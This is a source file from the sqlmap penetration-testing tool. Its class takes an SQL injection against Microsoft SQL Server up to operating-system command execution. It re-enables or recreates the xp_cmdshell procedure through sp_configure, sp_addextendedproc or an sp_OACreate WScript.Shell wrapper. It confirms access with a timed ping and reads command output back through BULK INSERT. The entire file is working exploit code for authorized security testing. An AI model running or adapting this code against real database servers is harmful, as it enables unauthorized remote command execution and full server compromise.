#!/usr/bin/env python

"""
$Id$

This file is part of the sqlmap project, http://sqlmap.sourceforge.net.

Copyright (c) 2007-2010 Bernardo Damele A. G. <bernardo.damele@gmail.com>
Copyright (c) 2006 Daniele Bellucci <daniele.bellucci@gmail.com>

sqlmap is free software; you can redistribute it and/or modify it under
the terms of the GNU General Public License as published by the Free
Software Foundation version 2 of the License.

sqlmap is distributed in the hope that it will be useful, but WITHOUT ANY
WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
FOR A PARTICULAR PURPOSE.  See the GNU General Public License for more
details.

You should have received a copy of the GNU General Public License along
with sqlmap; if not, write to the Free Software Foundation, Inc., 51
Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
"""

from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.convert import urlencode
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.exception import sqlmapUnsupportedFeatureException
from lib.request import inject
from lib.techniques.blind.timebased import timeUse

class xp_cmdshell:
    """
    This class defines methods to deal with Microsoft SQL Server
    xp_cmdshell extended procedure for plugins.
    """

    def __init__(self):
        self.xpCmdshellStr = "master..xp_cmdshell"

    def __xpCmdshellCreate(self):
        cmd = ""

        if kb.dbmsVersion[0] in ( "2005", "2008" ):
            logger.debug("activating sp_OACreate")

            cmd += "EXEC master..sp_configure 'show advanced options', 1; "
            cmd += "RECONFIGURE WITH OVERRIDE; "
            cmd += "EXEC master..sp_configure 'ole automation procedures', 1; "
            cmd += "RECONFIGURE WITH OVERRIDE; "
            self.xpCmdshellExecCmd(cmd)

        self.__randStr = randomStr(lowercase=True)

        cmd += "declare @%s nvarchar(999); " % self.__randStr
        cmd += "set @%s='" % self.__randStr
        cmd += "CREATE PROCEDURE xp_cmdshell(@cmd varchar(255)) AS DECLARE @ID int "
        cmd += "EXEC sp_OACreate ''WScript.Shell'', @ID OUT "
        cmd += "EXEC sp_OAMethod @ID, ''Run'', Null, @cmd, 0, 1 "
        cmd += "EXEC sp_OADestroy @ID'; "
        cmd += "EXEC master..sp_executesql @%s;" % self.__randStr

        if kb.dbmsVersion[0] in ( "2005", "2008" ):
            cmd += " RECONFIGURE WITH OVERRIDE;"

        self.xpCmdshellExecCmd(cmd)

    def __xpCmdshellConfigure2005(self, mode):
        debugMsg  = "configuring xp_cmdshell using sp_configure "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        cmd  = "EXEC master..sp_configure 'show advanced options', 1; "
        cmd += "RECONFIGURE WITH OVERRIDE; "
        cmd += "EXEC master..sp_configure 'xp_cmdshell', %d " % mode
        cmd += "RECONFIGURE WITH OVERRIDE; "
        cmd += "EXEC sp_configure 'show advanced options', 0"

        return cmd

    def __xpCmdshellConfigure2000(self, mode):
        debugMsg  = "configuring xp_cmdshell using sp_addextendedproc "
        debugMsg += "stored procedure"
        logger.debug(debugMsg)

        if mode == 1:
            cmd  = "EXEC master..sp_addextendedproc 'xp_cmdshell', "
            cmd += "@dllname='xplog70.dll'"
        else:
            cmd = "EXEC master..sp_dropextendedproc 'xp_cmdshell'"

        return cmd

    def __xpCmdshellConfigure(self, mode):
        if kb.dbmsVersion[0] in ( "2005", "2008" ):
            cmd = self.__xpCmdshellConfigure2005(mode)
        else:
            cmd = self.__xpCmdshellConfigure2000(mode)

        self.xpCmdshellExecCmd(cmd)

    def __xpCmdshellCheck(self):
        query    = self.xpCmdshellForgeCmd("ping -n %d 127.0.0.1" % (conf.timeSec * 2))
        duration = timeUse(query)

        if duration >= conf.timeSec:
            return True
        else:
            return False

    def xpCmdshellForgeCmd(self, cmd):
        forgedCmd = "EXEC %s '%s'" % (self.xpCmdshellStr, cmd)
        forgedCmd = urlencode(forgedCmd, convall=True)

        return forgedCmd

    def xpCmdshellExecCmd(self, cmd, silent=False, forgeCmd=False):
        if forgeCmd:
            cmd = self.xpCmdshellForgeCmd(cmd)

        inject.goStacked(cmd, silent)

    def xpCmdshellEvalCmd(self, cmd, first=None, last=None):
        self.getRemoteTempPath()

        tmpFile = "%s/tmpc%s.txt" % (conf.tmpPath, randomStr(lowercase=True))
        cmd     = self.xpCmdshellForgeCmd("%s > %s" % (cmd, tmpFile))

        self.xpCmdshellExecCmd(cmd)

        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.cmdTblName, tmpFile, randomStr(10), randomStr(10)))

        self.delRemoteFile(tmpFile)

        output = inject.getValue("SELECT %s FROM %s" % (self.tblField, self.cmdTblName), resumeValue=False, sort=False, firstChar=first, lastChar=last)
        inject.goStacked("DELETE FROM %s" % self.cmdTblName)

        if isinstance(output, (list, tuple)):
            output = output[0]

            if isinstance(output, (list, tuple)):
                output = output[0]

        return output

    def xpCmdshellInit(self):
        self.__xpCmdshellAvailable = False

        infoMsg  = "checking if xp_cmdshell extended procedure is "
        infoMsg += "available, wait.."
        logger.info(infoMsg)

        result = self.__xpCmdshellCheck()

        if result:
            logger.info("xp_cmdshell extended procedure is available")
            self.__xpCmdshellAvailable = True

        else:
            message  = "xp_cmdshell extended procedure does not seem to "
            message += "be available. Do you want sqlmap to try to "
            message += "re-enable it? [Y/n] "
            choice   = readInput(message, default="Y")

            if not choice or choice in ("y", "Y"):
                self.__xpCmdshellConfigure(1)

                if self.__xpCmdshellCheck():
                    logger.info("xp_cmdshell re-enabled successfully")
                    self.__xpCmdshellAvailable = True

                else:
                    logger.warn("xp_cmdshell re-enabling failed")

                    logger.info("creating xp_cmdshell with sp_OACreate")
                    self.__xpCmdshellConfigure(0)
                    self.__xpCmdshellCreate()

                    if self.__xpCmdshellCheck():
                        logger.info("xp_cmdshell created successfully")
                        self.__xpCmdshellAvailable = True

                    else:
                        warnMsg  = "xp_cmdshell creation failed, probably "
                        warnMsg += "because sp_OACreate is disabled"
                        logger.warn(warnMsg)

        if not self.__xpCmdshellAvailable:
            errMsg = "unable to proceed without xp_cmdshell"
            raise sqlmapUnsupportedFeatureException, errMsg

        debugMsg  = "creating a support table to write commands standard "
        debugMsg += "output to"
        logger.debug(debugMsg)

        self.createSupportTbl(self.cmdTblName, self.tblField, "varchar(8000)")
